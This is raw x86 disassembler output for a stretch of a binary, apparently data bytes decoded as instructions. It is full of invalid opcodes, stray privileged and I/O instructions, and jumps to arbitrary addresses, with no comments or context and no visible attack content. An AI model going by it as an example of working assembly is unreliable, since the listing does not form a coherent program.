  438b67:	adc    al,0x8d
  438b69:	lahf   
  438b6a:	outs   dx,DWORD PTR ds:[esi]
  438b6b:	jmp    0x438b90
  438b6d:	into   
  438b6e:	(bad)  
  438b6f:	call   0xdbbfd173
  438b74:	pop    es
  438b75:	and    BYTE PTR [esi],ah
  438b77:	inc    ecx
  438b78:	cmp    ecx,esi
  438b7a:	add    al,0xe9
  438b7c:	jg     0x438bc9
  438b7e:	icebp  
  438b7f:	loopne 0x438bbd
  438b81:	leave  
  438b82:	and    al,0x0
  438b84:	adc    eax,0x0
	...
  438b9d:	add    BYTE PTR [eax-0x13268c98],dh
  438ba3:	lock (bad) 
  438ba6:	xor    dl,BYTE PTR [ebx+edi*8]
  438ba9:	xchg   esp,eax
  438baa:	out    dx,eax
  438bab:	pop    esp
  438bac:	push   0x14
  438bae:	fsubr  QWORD PTR [edx-0x1a]
  438bb1:	stc    
  438bb2:	int3   
  438bb3:	lock adc eax,DWORD PTR [esi]
  438bb6:	pop    edx
  438bb7:	clc    
  438bb8:	push   ecx
  438bb9:	(bad)  
  438bba:	push   ecx
  438bbb:	add    bl,bh
  438bbd:	fadd   QWORD PTR [ebx]
  438bbf:	adc    al,BYTE PTR [eax-0x17]
  438bc2:	dec    ebp
  438bc3:	leave  
  438bc4:	mov    ebp,0x86d1f7f9
  438bc9:	int    0x92
  438bcb:	add    BYTE PTR [eax],ah
  438bcd:	mov    bh,0x37
  438bcf:	push   0xf17f36fe
  438bd4:	or     edi,DWORD PTR ds:0xddf75cd1
  438bda:	test   DWORD PTR [esp+eax*4],0x371004a9
  438be1:	hlt    
  438be2:	pop    ss
  438be3:	dec    ecx
  438be4:	ds jmp 0x153e83ce
  438bea:	or     BYTE PTR [eax-0xe9d02b4],al
  438bf0:	pop    es
  438bf1:	and    DWORD PTR [ecx],0x5f86fa6a
  438bf7:	clc    
  438bf8:	cli    
  438bf9:	hlt    
  438bfa:	repz imul esi,DWORD PTR [ecx+ebx*8-0x57],0x6a
  438c00:	je     0x438be3
	...
  438c1a:	add    BYTE PTR [edx],ch
  438c1c:	adc    DWORD PTR [esp+edi*8],ebp
  438c1f:	mov    bh,0x67
  438c21:	pop    esp
  438c22:	mov    esp,0xbbfff835
  438c27:	outs   dx,BYTE PTR ds:[esi]
  438c28:	pop    ebx
  438c29:	icebp  
  438c2a:	in     al,0xd7
  438c2c:	dec    edx
  438c2d:	add    BYTE PTR ds:[ebp+0x488b5067],bl
  438c34:	push   DWORD PTR [ebx+0x21]
  438c37:	xor    eax,0x5d0016b3
  438c3c:	out    0xba,eax
  438c3e:	je     0x438c35
  438c40:	sub    esi,DWORD PTR ds:0xfa442120
  438c46:	je     0x438ca5
  438c48:	out    dx,al
  438c49:	jae    0x438c5b
  438c4b:	(bad)  
  438c4c:	cmp    eax,0xfbc8ff0e
  438c51:	out    0xe3,eax
  438c53:	inc    ecx
  438c54:	out    dx,al
  438c55:	cmc    
  438c56:	jmp    0x438c75
  438c58:	out    dx,al
  438c59:	jae    0x438c6f
  438c5b:	and    dh,BYTE PTR [edx+ecx*1+0x56]
  438c5f:	adc    dh,BYTE PTR [edx+eax*1-0x1]
  438c63:	sub    BYTE PTR [edi+0xe],al
  438c66:	inc    eax
  438c67:	or     eax,0xdc25b51
  438c6c:	add    edx,DWORD PTR [ebp-0x75]
  438c6f:	and    ecx,ebx
  438c71:	add    esp,DWORD PTR [eax]
  438c73:	arpl   WORD PTR [edx-0x6],ax
  438c76:	add    ebx,ebx
  438c78:	jnp    0x438ced
  438c7a:	adc    BYTE PTR [ecx],ch
  438c7c:	and    al,ch
  438c7e:	ins    BYTE PTR es:[edi],dx
	...
  438c97:	add    cl,dh
  438c99:	add    BYTE PTR [eax],al
  438c9b:	test   BYTE PTR [ebp-0x47c4edaa],cl
  438ca1:	and    bl,ah
  438ca3:	inc    ebx
  438ca4:	fnsave [ebp+0xa]
  438ca7:	dec    eax
  438ca9:	test   BYTE PTR [edx+0x73efd54d],0x8
  438cb0:	jne    0x438c3f
  438cb2:	idiv   bh
  438cb4:	and    bl,bl
  438cb6:	or     edi,edi
  438cb8:	enter  0xf70a,0x75
  438cbc:	test   eax,0xf475f538
  438cc1:	pop    edi
  438cc2:	jno    0x438d38
  438cc4:	cld    
  438cc5:	mov    dh,0xf
  438cc7:	push   eax
  438cc8:	loopne 0x438c65
  438cca:	(bad)  
  438ccb:	pop    ecx
  438ccc:	and    DWORD PTR [edx],ebx
  438cce:	or     eax,DWORD PTR [eax]
  438cd0:	and    ebx,esp
  438cd2:	(bad)  
  438cd4:	stc    
  438cd5:	sti    
  438cd6:	push   ecx
  438cd7:	ds hlt 
  438cd9:	push   edi
  438cda:	int3   
  438cdb:	xchg   cl,ch
  438cdd:	imul   ebp,edx,0x20
  438ce0:	dec    esp
  438ce1:	cmp    edx,DWORD PTR [edx]
  438ce3:	add    ah,dh
  438ce5:	fistp  QWORD PTR [esi]
  438ce7:	jae    0x438cd5
  438ce9:	inc    edx
  438cea:	das    
  438ceb:	and    BYTE PTR [eax],ah
  438ced:	fwait
  438cee:	(bad)  
  438cef:	je     0x438cd5
  438cf1:	outs   dx,BYTE PTR ds:[esi]
  438cf2:	jmp    0xa1fb:0x16897f13
  438cf9:	jae    0x438d61
  438cfb:	push   ebx
	...
  438d14:	add    BYTE PTR [eax],ah
  438d16:	inc    edi
  438d17:	je     0x438cff
  438d19:	pop    es
  438d1a:	dec    edi
  438d1b:	jmp    0xb52:0xfd11317
  438d22:	sub    DWORD PTR [eax],ecx
  438d24:	sti    
  438d25:	mov    DWORD PTR [ebx+0x73],esi
  438d28:	adc    al,0xc4
  438d2a:	dec    eax
  438d2b:	mov    esi,0x3df951ff
  438d30:	adc    esi,esp
  438d32:	sub    BYTE PTR [ecx+0x1e60eaeb],cl
  438d38:	fidiv  DWORD PTR [edi]
  438d3a:	pop    esp
  438d3b:	cli    
  438d3c:	push   ecx
  438d3d:	jg     0x438d4f
  438d3f:	or     BYTE PTR [ebp+edx*1-0x6c],dh
  438d43:	push   ebp
  438d44:	push   ss
  438d45:	hlt    
  438d46:	pop    ebx
  438d47:	jp     0x438d08
  438d49:	inc    eax
  438d4a:	push   esp
  438d4b:	aaa    
  438d4c:	xor    eax,0xffc077d4
  438d51:	and    BYTE PTR ds:0x152874f9,al
  438d57:	outs   dx,BYTE PTR ds:[esi]
  438d58:	mov    DWORD PTR [edi],0x9c0bdb66
  438d5e:	stc    
  438d5f:	dec    esp
  438d60:	jne    0x438cf0
  438d62:	pop    ecx
  438d63:	fdiv   DWORD PTR [eax+ecx*1+0x11]
  438d67:	cmp    ch,bh
  438d69:	jmp    0x438d39
  438d6b:	xor    edi,ebp
  438d6d:	sti    
  438d6e:	gs rol ebx,cl
  438d71:	add    ch,al
  438d73:	call   0xf8864e4d
  438d78:	add    eax,DWORD PTR [eax]
	...
  438d92:	sar    DWORD PTR [ecx+0x4],0x6e
  438d96:	clc    
  438d97:	and    al,0x2b
  438d99:	ror    DWORD PTR [ebx+0x1],0x9b
  438d9d:	mov    al,cl
  438d9f:	clc    
  438da0:	je     0x438dc4
  438da2:	dec    esp
  438da3:	nop
  438da4:	int    0x3
  438da6:	hlt    
  438da7:	sub    BYTE PTR [eax],0xf0
  438daa:	add    ebp,DWORD PTR [edx]
  438dac:	sbb    al,0x24
  438dae:	inc    eax
  438daf:	shr    eax,0xee
  438db2:	jmp    0x438e19
  438db4:	pop    ebx
  438db5:	adc    al,0x7b
  438db7:	mov    bh,0xf4
  438db9:	je     0x438d3b
  438dbb:	cld    
  438dbc:	sar    BYTE PTR [esi],1
  438dbe:	or     ah,BYTE PTR [ebp-0x47]
  438dc1:	push   0x103b65eb
  438dc6:	out    dx,eax
  438dc7:	fcmovu st,st(0)
  438dc9:	int    0xee
  438dcb:	(bad)  
  438dcd:	je     0x438dd7
  438dcf:	in     eax,0xf4
  438dd1:	ret    
  438dd2:	fcmovnb st,st(2)
  438dd4:	xor    eax,DWORD PTR [edx+0x3]
  438dd7:	add    eax,0x5bdf8934
  438ddc:	jmp    0x438e01
  438dde:	sahf   
  438ddf:	enter  0xffe8,0x25
  438de3:	nop
  438de4:	(bad)  
  438de5:	sti    
  438de6:	pop    es
  438de7:	fldenv [eax]
  438de9:	xor    DWORD PTR [ecx+0x23e8fffb],0xdd0173a4
  438df3:	sbb    DWORD PTR [eax],esp
  438df5:	xor    eax,0x0
	...
  438e0e:	add    BYTE PTR [esp+eiz*2-0x26ff068d],dh
  438e15:	adc    esi,DWORD PTR [edx-0x46]
  438e18:	cld    
  438e19:	cli    
  438e1a:	mov    ah,0xf3
  438e1c:	ins    BYTE PTR es:[edi],dx
  438e1d:	jp     0x438e51
  438e1f:	call   0xe11e7482
  438e24:	fcom   DWORD PTR [edi]
  438e26:	es push edx
  438e28:	clc    
  438e29:	push   ecx
  438e2a:	push   ds
  438e2b:	dec    edx
  438e2c:	adc    bl,bh
  438e2e:	pushf  
  438e2f:	call   FWORD PTR [edi+0x14]
  438e32:	mov    ch,0xfb
  438e34:	(bad)  
  438e35:	jmp    DWORD PTR [esi-0x16ec5dd6]
  438e3b:	sub    cl,BYTE PTR [ebx+0x431ffeb]
  438e41:	fisubr DWORD PTR [edx+0x725208f7]
  438e47:	sbb    eax,0xb8087414
  438e4c:	or     BYTE PTR [edi],dl
  438e4e:	jmp    0x5603174a
  438e53:	clc    
  438e54:	sbb    esi,DWORD PTR ds:0x22a409
  438e5a:	xor    al,0xe0
  438e5c:	pop    edi
  438e5d:	je     0x438e3c
  438e5f:	jb     0x438e32
  438e61:	pop    ss
  438e62:	scas   al,BYTE PTR es:[edi]
  438e63:	in     eax,dx
  438e64:	psubsb mm3,mm7
  438e67:	push   edx
  438e68:	pop    edi
  438e69:	cli    
  438e6a:	xchg   edx,eax
  438e6b:	add    esp,DWORD PTR [eax+0x74]
  438e6e:	icebp  
  438e6f:	inc    esi
  438e70:	fst    DWORD PTR [ebx]
  438e72:	aaa    
	...
  438e8b:	add    BYTE PTR [edi-0x27],al
  438e8e:	or     eax,DWORD PTR [eax]
  438e90:	jp     0x438eef
  438e92:	add    bh,bh
  438e94:	mov    al,ds:0x9d400e4f
  438e99:	xor    eax,0x7c1c25b
  438e9e:	xor    eax,DWORD PTR ds:0x3ffba5
  438ea4:	ror    BYTE PTR ds:0x4ad88eb8,0xfa
  438eab:	ret    0xde6
  438eae:	cmp    al,0x15
  438eb0:	dec    ebp
  438eb1:	pop    es
  438eb2:	jne    0x438eba
  438eb4:	jne    0x438e72
  438eb6:	retf   
  438eb7:	inc    edx
  438eb8:	pop    ebp
  438eb9:	retf   0x531
  438ebc:	popf   
  438ebd:	cld    
  438ebe:	aas    
  438ebf:	add    BYTE PTR [eax+0xa38b80d],al
  438ec5:	dec    ebx
  438ec6:	cli    
  438ec7:	ret    0xc36
  438eca:	pusha  
  438ecb:	adc    al,0x9d
  438ecd:	pop    es
  438ece:	out    dx,eax
  438ecf:	fcom   DWORD PTR [esi-0x39]
  438ed2:	in     eax,dx
  438ed3:	shl    BYTE PTR [eax],1
  438ed5:	push   ebp
  438ed6:	lds    eax,FWORD PTR [edx+0x1d]
  438ed9:	retf   0x8b53
  438edc:	sub    DWORD PTR [edx+0xc4328e6],ecx
  438ee2:	and    dh,bl
  438ee4:	into   
  438ee5:	or     BYTE PTR [esi+edx*2],al
  438ee8:	xchg   esi,eax
  438ee9:	pop    esp
  438eea:	add    dh,BYTE PTR [ebx+ecx*1-0x41]
  438eee:	jnp    0x438f0a
	...
  438f08:	add    BYTE PTR ds:0xc1c08407,cl
  438f0e:	sub    eax,0x2831f685
  438f13:	add    DWORD PTR [esi-0x2f],0xffffffbe
  438f17:	xchg   esi,eax
  438f18:	call   FWORD PTR [edx+0x1c083d7]
  438f1e:	cld    
  438f1f:	popa   
  438f20:	sub    ah,dh
  438f22:	and    DWORD PTR [ecx+0x5c1dac4c],eax
  438f28:	push   0x886d8b84
  438f2d:	xor    DWORD PTR [eax-0x333bb81],eax
  438f33:	pop    edx
  438f34:	add    BYTE PTR [edx-0xd],al
  438f37:	pop    ss
  438f38:	pop    esp
  438f39:	or     BYTE PTR [esi+edi*8+0x32ead59],ch
  438f40:	add    BYTE PTR [ecx],ch
  438f42:	out    0x5a,eax
  438f44:	jle    0x438ede
  438f46:	add    al,0x76
  438f48:	add    al,0xd4
  438f4a:	sub    edx,eax
  438f4c:	push   edi
  438f4e:	jns    0x438fc9
  438f50:	je     0x438f4e
  438f52:	lahf   
  438f53:	and    al,ch
  438f55:	and    al,0x36
  438f57:	(bad)  
  438f58:	(bad)  
  438f59:	js     0x438f87
  438f5b:	repz and al,0x71
  438f5e:	cli    
  438f5f:	repnz and BYTE PTR [edi-0x4e],bh
  438f63:	add    ch,al
  438f65:	mov    ebx,0x79fa6e12
  438f6a:	sub    al,0xf3
  438f6c:	adc    al,0x0
	...
  438f86:	into   
  438f87:	xor    ebx,eax
  438f89:	mov    ecx,es
  438f8b:	repz shl edi,cl
  438f8e:	or     BYTE PTR [esi+ebp*2],bl
  438f91:	cli    
  438f92:	ins    DWORD PTR es:[edi],dx
  438f93:	xor    DWORD PTR [eax-0x74],edx
  438f96:	mov    cl,0x43
  438f98:	shl    esi,cl
  438f9a:	cmc    
  438f9b:	and    DWORD PTR [ecx+0x14],esi
  438f9e:	mov    eax,0xa1ffbe57
  438fa3:	xchg   esp,eax
  438fa4:	inc    ecx
  438fa5:	add    esi,esp
  438fa7:	clc    
  438fa8:	jl     0x438f95
  438faa:	ja     0x438ff3
  438fac:	xor    esi,edx
  438fae:	icebp  
  438faf:	or     ecx,DWORD PTR [esi+0x3e]
  438fb2:	hlt    
  438fb3:	add    al,0xed
  438fb5:	fnstenv [edx-0x29]
  438fb8:	lock mul DWORD PTR [edx]
  438fbb:	ins    DWORD PTR es:[edi],dx
  438fbc:	test   DWORD PTR [ebx],ecx
  438fbe:	hlt    
  438fbf:	add    al,0x65
  438fc1:	inc    esp
  438fc2:	inc    edi
  438fc3:	das    
  438fc4:	ins    BYTE PTR es:[edi],dx
  438fc5:	jp     0x43900e
  438fc7:	sub    esp,DWORD PTR [esi+0x32]
  438fca:	in     al,0xd7
  438fcc:	(bad)  
  438fcd:	jl     0x439004
  438fcf:	or     eax,0x619d6f81
  438fd4:	popa   
  438fd5:	xchg   DWORD PTR [ebx-0x28],ebx
  438fd8:	repz fucom st(3)
  438fdb:	mov    edx,0xb3bbbf63
  438fe0:	inc    eax
  438fe1:	ds dec esi
  438fe3:	popa   
  438fe4:	inc    ecx
  438fe5:	jnp    0x439017
  438fe7:	cmp    eax,0xc76b
	...
  439000:	add    BYTE PTR [eax],al
  439002:	add    BYTE PTR [ebx-0x4c],al
  439005:	cmp    eax,0xd361c603
  43900a:	sub    ecx,DWORD PTR [ecx]
  43900c:	(bad)
  43900f:	sub    al,0x46
  439011:	in     al,0x3
  439013:	test   eax,0x5f85048d
  439018:	adc    al,0x13
  43901a:	pop    es
  43901b:	adc    al,0x43
  43901d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43901e:	add    esi,eax
  439020:	mov    edx,0xd8fbf76d
  439025:	mov    ch,0x5b
  439027:	test   bl,bh
  439029:	call   0x5c880831
  43902e:	push   ds
  43902f:	jno    0x43908b
  439031:	push   esp
  439032:	sub    dl,BYTE PTR [ebx-0x2b08e6de]
  439038:	lea    esp,[edx]
  43903a:	cld    
  43903b:	sbb    ebp,DWORD PTR [ebp-0x79018f3e]
  439041:	test   al,0xf7
  439043:	or     bl,ch
  439045:	(bad)  
  439046:	clc    
  439047:	int    0x91
  439049:	dec    esp
  43904a:	cdq    
  43904b:	(bad)  
  43904c:	push   0x5b645677
  439051:	mov    BYTE PTR [eax+eax*2],ah
  439054:	xchg   ecx,eax
  439055:	inc    esp
  439056:	mov    ecx,0x370067a7
  43905b:	inc    ebp
  43905c:	stc    
  43905d:	daa    
  43905e:	fdiv   QWORD PTR [edi+0x39b05c60]
  439064:	add    al,0x0
  439066:	sbb    al,0x0
	...
  439080:	sub    DWORD PTR [esi+ecx*2+0x16],ebp
  439084:	and    DWORD PTR [esi-0x19],eax
  439087:	fcomip st,st(7)
  439089:	add    al,0x0
  43908b:	push   ecx
  43908c:	dec    BYTE PTR [eax]
  43908e:	add    cl,ch
  439090:	shl    BYTE PTR [edi],0x4e
  439093:	mov    edx,0xd9745ba8
  439098:	clc    
  439099:	push   edi
  43909a:	push   edx
  43909b:	or     dh,BYTE PTR ds:[ecx-0x4c0856ec]
  4390a2:	mov    bh,ah
  4390a4:	mov    edi,0xe426a960
  4390a9:	sbb    al,0x1a
  4390ab:	xchg   esp,eax
  4390ac:	sti    
  4390ad:	rol    BYTE PTR cs:[edx],0x89
  4390b1:	fwait
  4390b2:	add    edi,DWORD PTR [ecx-0x533e9fc9]
  4390b8:	out    0x8,eax
  4390ba:	add    cl,ch
  4390bc:	mul    esi
  4390be:	add    esp,DWORD PTR [esp+edi*1+0x4]
  4390c2:	push   eax
  4390c3:	out    dx,al
  4390c4:	jmp    0x439121
  4390c6:	xor    esi,esp
  4390c8:	std    
  4390c9:	nop
  4390ca:	adc    al,0x29
  4390cc:	clc    
  4390cd:	ffreep st(2)
  4390cf:	loope  0x43906b
  4390d1:	ror    BYTE PTR [edi],1
  4390d3:	push   esp
  4390d4:	mov    al,ds:0xa7004ece
  4390d9:	add    ecx,DWORD PTR [ebx+0x53]
  4390dc:	mov    dl,0x5d
  4390de:	push   es
  4390df:	jmp    FWORD PTR [eax]
  4390e1:	popa   
  4390e2:	cmc    
  4390e3:	add    BYTE PTR ss:[eax],al
	...
  4390fa:	add    BYTE PTR [eax],al
  4390fc:	add    BYTE PTR [edx+0xd15c3fd],dl
  439102:	or     DWORD PTR [ecx-0x44d526ba],ecx
  439108:	jne    0x4390de
  43910a:	fcmovb st,st(0)
  43910c:	call   0x4394e8
  439111:	pushfw 
  439113:	stos   BYTE PTR es:[edi],al
  439114:	add    DWORD PTR [edx],edx
  439116:	dec    esp
  439117:	pop    ebx
  439118:	ret    0x391
  43911b:	dec    esi
  43911c:	push   edi
  43911d:	push   ss
  43911e:	(bad)  
  439120:	and    ecx,DWORD PTR [ebp+0x5b8b0003]
  439126:	pop    es
  439127:	cmp    DWORD PTR ds:0x3ffd75,0x18
  43912e:	leave  
  43912f:	outs   dx,BYTE PTR ds:[esi]
  439130:	pop    es
  439131:	pop    ebp
  439132:	out    dx,al
  439133:	int    0x83
  439135:	cmp    eax,DWORD PTR [edi]
  439137:	add    BYTE PTR [ebx+0x74ba8c5b],cl
  43913d:	pop    ebx
  43913e:	xor    esi,ebp
  439140:	xlat   BYTE PTR ds:[ebx]
  439141:	into   
  439142:	add    BYTE PTR es:[edi-0x6d],bl
  439146:	ret    0x4681
  439149:	push   ebp
  43914a:	mov    WORD PTR [edx-0xacca98c],?
  439150:	adc    eax,0x3ffda5
  439155:	sahf   
  439156:	data16 add al,BYTE PTR [eax]
  439159:	fidivr WORD PTR ds:0xe48cec81
  43915f:	adc    al,BYTE PTR [ecx]
	...
  439179:	add    BYTE PTR ds:0x84564b03,cl
  43917f:	dec    esp
  439180:	test   BYTE PTR [ebx-0x2902f0c],0xaa
  439187:	loop   0x4391fc
  439189:	mov    dh,0xf4
  43918b:	inc    esi
  43918c:	cli    
  43918d:	sub    DWORD PTR [eax+0x69],0xffffffa5
  439191:	(bad)  
  439192:	jmp    0x217:0xf8a78828
  439199:	sub    DWORD PTR [edi-0xb800194],0x347166be
  4391a3:	ins    BYTE PTR es:[edi],dx
  4391a4:	xchg   esi,eax
  4391a5:	add    BYTE PTR [ecx+0x69],cl
  4391a8:	test   eax,0x42c42ff
  4391ad:	call   0xfaad7115
  4391b2:	push   ds
  4391b3:	ins    BYTE PTR es:[edi],dx
  4391b4:	int    0x67
  4391b6:	lods   al,BYTE PTR ds:[esi]
  4391b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4391b8:	mov    ebp,0xd66c0dff
  4391bd:	jmp    0x4391c9
  4391bf:	lods   al,BYTE PTR ds:[esi]
  4391c0:	(bad)  
  4391c1:	cli    
  4391c2:	add    DWORD PTR [ecx+edx*8-0x6],esp
  4391c6:	or     ch,BYTE PTR [eax+0x69]
  4391c9:	adc    al,0x3c
  4391cb:	inc    ecx
  4391cc:	mov    esi,0xf6a67cff
  4391d1:	test   BYTE PTR [edi+eiz*2],dh
  4391d4:	xor    al,0xf4
  4391d7:	imul   edi,esi,0x65
  4391da:	lock fdivr DWORD PTR [edi+0x7]
	...
  4391f5:	add    BYTE PTR [eax],al
  4391f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4391f8:	jno    0x4391b9
  4391fa:	dec    edi
  4391fb:	xor    esi,DWORD PTR [ecx+0x6bf400f6]
  439201:	(bad)  
  439202:	cli    
  439203:	loope  0x4391dc
  439205:	pop    ss
  439206:	inc    eax
  439207:	hlt    
  439208:	repz adc al,0xec
  43920b:	sub    edx,DWORD PTR [edi+0x78]
  43920e:	cmp    al,0x68
  439210:	cmp    DWORD PTR [esi-0x16faa101],edi
  439216:	add    esi,esp
  439218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439219:	sbb    al,0x8
  43921b:	or     DWORD PTR [edi],0x5e0fc6c1
  439221:	leave  
  439222:	mov    BYTE PTR [ebx],bh
  439224:	push   cs
  439225:	ins    DWORD PTR es:[edi],dx
  439226:	xchg   ebx,esi
  439228:	pop    ebp
  439229:	call   0x1950c2ac
  43922e:	jg     0x4392a8
  439230:	pop    ebx
  439231:	stos   BYTE PTR es:[edi],al
  439232:	ins    DWORD PTR es:[edi],dx
  439233:	fidiv  WORD PTR [ecx+ebp*4-0x17fb0439]
  43923a:	add    esi,esp
  43923c:	pop    ebp
  43923d:	sti    
  43923e:	fcomi  st,st(2)
  439240:	(bad)  
  439241:	call   0x101b0dcc
  439246:	lods   al,BYTE PTR ds:[esi]
  439247:	scas   al,BYTE PTR es:[edi]
  439248:	add    al,0xe9
  43924a:	add    ebp,ebp
  43924c:	(bad)  
  43924d:	loopne 0x43924b
  43924f:	loope  0x439218
  439251:	loopne 0x439298
  439253:	ja     0x43925c
  439255:	pusha  
  439256:	outs   dx,BYTE PTR ds:[esi]
  439257:	mov    ds,WORD PTR [ebp-0x18]
  43925a:	jle    0x43925c
	...
  439274:	jo     0x4392d1
  439276:	push   edx
  439277:	ins    DWORD PTR es:[edi],dx
  439278:	jle    0x43922e
  43927a:	dec    ecx
  43927b:	pop    ss
  43927c:	mov    al,0xf2
  43927e:	test   al,0x3
  439280:	jge    0x439249
  439282:	lock xchg BYTE PTR [ebx+0x4d9a7d8],ch
  439289:	nop
  43928a:	arpl   WORD PTR [ebp+ebx*2+0x5d],bx
  43928e:	and    esp,ebx
  439290:	repz mov gs,WORD PTR [eax-0x4a25bfd]
  439297:	mov    edi,0x78e8c4e5
  43929c:	mov    al,0xc
  43929e:	dec    ax
  4392a0:	(bad)  
  4392a1:	in     al,dx
  4392a2:	xchg   esp,eax
  4392a3:	jmp    0x86c:0x640004eb
  4392aa:	stc    
  4392ab:	out    dx,eax
  4392ac:	mov    BYTE PTR [edx+0x4f],bl
  4392af:	out    0xea,al
  4392b1:	or     al,0x11
  4392b3:	sub    eax,esi
  4392b5:	test   DWORD PTR [ecx+eiz*8+0x24],eax
  4392b9:	fidivr WORD PTR [edi-0x7b6fd806]
  4392bf:	shl    DWORD PTR [ecx+0x5f],1
  4392c2:	cli    
  4392c3:	sbb    DWORD PTR [ecx-0x2a],ebx
  4392c6:	pop    es
  4392c7:	mov    dh,0x48
  4392c9:	fstp   TBYTE PTR [ebp+ebp*4-0x9]
  4392cd:	ror    DWORD PTR ds:0x680bae3a,1
  4392d3:	aad    0x49
  4392d5:	sbb    al,0x0
  4392d7:	xchg   esi,eax
	...
  4392f0:	add    cl,cl
  4392f2:	add    al,0xfb
  4392f4:	mov    dh,0x74
  4392f6:	push   esp
  4392f7:	add    ah,bh
  4392f9:	jmp    FWORD PTR [ebx]
  4392fb:	rcr    BYTE PTR [ecx],0xc0
  4392fe:	int3   
  4392ff:	dec    edi
  439300:	jbe    0x4392ab
  439302:	add    al,0xfb
  439304:	aam    0x67
  439306:	icebp  
  439307:	aas    
  439308:	jmp    0xd443e781
  43930d:	repz cmp BYTE PTR [edi-0x6d9307be],0x4f
  439315:	or     BYTE PTR [edi+0x2d],bl
  439318:	sub    DWORD PTR [eax-0x42],eax
  43931b:	push   esi
  43931c:	xor    BYTE PTR [ebp-0x2363fff9],dh
  439322:	outs   dx,DWORD PTR ds:[esi]
  439323:	push   eax
  439324:	cwde   
  439325:	inc    esp
  439326:	mov    dh,0x86
  439328:	sbb    DWORD PTR [eax],ebp
  43932a:	xor    ecx,0x7e24995
  439330:	xor    edi,0xffffffb6
  439333:	cli    
  439334:	hlt    
  439335:	daa    
  439336:	idiv   BYTE PTR [edi]
  439338:	add    BYTE PTR ds:0x9e0cbe85,bl
  43933e:	(bad)  
  439340:	add    dl,ch
  439342:	pop    es
  439343:	adc    BYTE PTR [eax],al
  439345:	or     eax,0x69bce231
  43934a:	lock cmc 
  43934c:	mov    esi,DWORD PTR ds:0x910fd186
  439352:	fdiv   st(2),st
  439354:	inc    DWORD PTR [eax]
	...
  43936e:	or     eax,0xdd0c7b83
  439373:	imul   ecx,DWORD PTR [edx+ebp*2],0xffffffdd
  439377:	out    dx,al
  439378:	jae    0x439386
  43937a:	stos   BYTE PTR es:[edi],al
  43937b:	cmc    
  43937c:	sbb    edx,DWORD PTR [ebx]
  43937e:	or     eax,0xdc023d01
  439383:	pop    es
  439384:	add    BYTE PTR [ebp-0x2],dh
  439387:	fld    QWORD PTR [ebx-0x4]
  43938a:	std    
  43938b:	fild   DWORD PTR [ebx+0x8]
  43938e:	add    dh,BYTE PTR [esi*8+0x7bd8a570]
  439395:	cld    
  439396:	sub    dh,dh
  439398:	(bad)  
  439399:	adc    eax,0xc08500cd
  43939e:	mov    eax,ds:0x19458199
  4393a3:	xchg   BYTE PTR [edx+0x4501d474],bh
  4393a9:	clc    
  4393aa:	or     al,0x6e
  4393ac:	repnz retf 0x799
  4393b0:	add    BYTE PTR [edi+0x72],dh
  4393b3:	test   al,dh
  4393b5:	je     0x43942c
  4393b7:	fisttp DWORD PTR [eax+0x4]
  4393ba:	dec    esi
  4393bb:	pop    ds
  4393bc:	jecxz  0x43937c
  4393be:	jbe    0x4393af
  4393c0:	cmc    
  4393c1:	test   BYTE PTR ds:0x60ff2355,bl
  4393c7:	jecxz  0x43934a
  4393c9:	push   es
  4393ca:	hlt    
  4393cb:	outs   dx,BYTE PTR ds:[esi]
  4393cc:	rol    BYTE PTR [ebx],0xa7
  4393cf:	popf   
  4393d0:	gs adc al,0x0
	...
  4393eb:	sar    BYTE PTR [ebx],0xbe
  4393ee:	(bad)  
  4393ef:	jle    0x439391
  4393f1:	bound  edi,QWORD PTR [esi+0x38]
  4393f4:	popa   
  4393f5:	add    eax,DWORD PTR [edx-0x10]
  4393f8:	push   es
  4393f9:	ja     0x439449
  4393fb:	sbb    al,0xc6
  4393fd:	xchg   edi,eax
  4393fe:	cli    
  4393ff:	or     edi,DWORD PTR [ebp+0x3]
  439402:	out    0xe7,eax
  439404:	push   ds
  439405:	pop    esp
  439406:	push   eax
  439407:	dec    eax
  439408:	dec    edx
  439409:	gs test dl,ch
  43940c:	sbb    bh,bh
  43940e:	cli    
  43940f:	and    dh,BYTE PTR [eax+eax*8]
  439412:	stos   DWORD PTR es:[edi],eax
  439413:	jecxz  0x4393a8
  439415:	xor    al,0xc0
  439417:	cmp    ecx,DWORD PTR [edx]
  439419:	retf   
  43941a:	enter  0x54b6,0xfe
  43941e:	push   esp
  43941f:	jg     0x4393a9
  439421:	sub    ebx,0x2ecf1ee8
  439427:	lahf   
  439428:	pop    ds
  439429:	fdivr  QWORD PTR [edi-0xc]
  43942c:	imul   edi,esi,0x65
  43942f:	idiv   dh
  439431:	fld    DWORD PTR [eax]
  439433:	or     al,0x6c
  439435:	(bad)  
  439436:	push   DWORD PTR [ebx+ebp*8]
  439439:	out    dx,eax
  43943a:	or     edi,DWORD PTR [ecx+eax*2+0x65]
  43943e:	cli    
  43943f:	loope  0x4393ec
  439441:	adc    al,0x40
  439443:	hlt    
  439444:	out    0x66,al
  439446:	jle    0x4394c3
  439448:	retf   
  439449:	cmc    
  43944a:	adc    DWORD PTR [ecx+0xfffe6c],0x0
	...
  439465:	add    BYTE PTR [eax],al
  439467:	add    dl,al
  439469:	fsin   
  43946b:	pmuludq mm5,QWORD PTR [ebx-0x30]
  43946f:	out    0x54,eax
  439471:	xchg   DWORD PTR [ebp-0x6],esp
  439474:	jge    0x43947b
  439476:	lods   al,BYTE PTR ds:[esi]
  439477:	outs   dx,DWORD PTR ds:[esi]
  439478:	add    al,BYTE PTR [esi-0x6c]
  43947b:	lock ins BYTE PTR es:[edi],dx
  43947d:	mov    eax,0xf4992c10
  439482:	xchg   esp,eax
  439483:	adc    al,0xc3
  439485:	pop    ecx
  439486:	jnp    0x43949b
  439488:	das    
  439489:	lock fcom QWORD PTR [esi]
  43948c:	mov    ah,0x4
  43948e:	mov    ah,0x5
  439490:	cmc    
  439491:	add    al,0xe9
  439493:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439495:	xchg   DWORD PTR [ebx],ebp
  439497:	je     0x439454
  439499:	lea    esp,[ebx]
  43949b:	cld    
  43949c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43949d:	pop    ecx
  43949e:	pop    ebx
  43949f:	jo     0x43949f
  4394a1:	aam    0xe0
  4394a3:	push   0xc3db7508
  4394a8:	jmp    0x43942a
  4394aa:	test   al,0xf0
  4394ac:	pop    ds
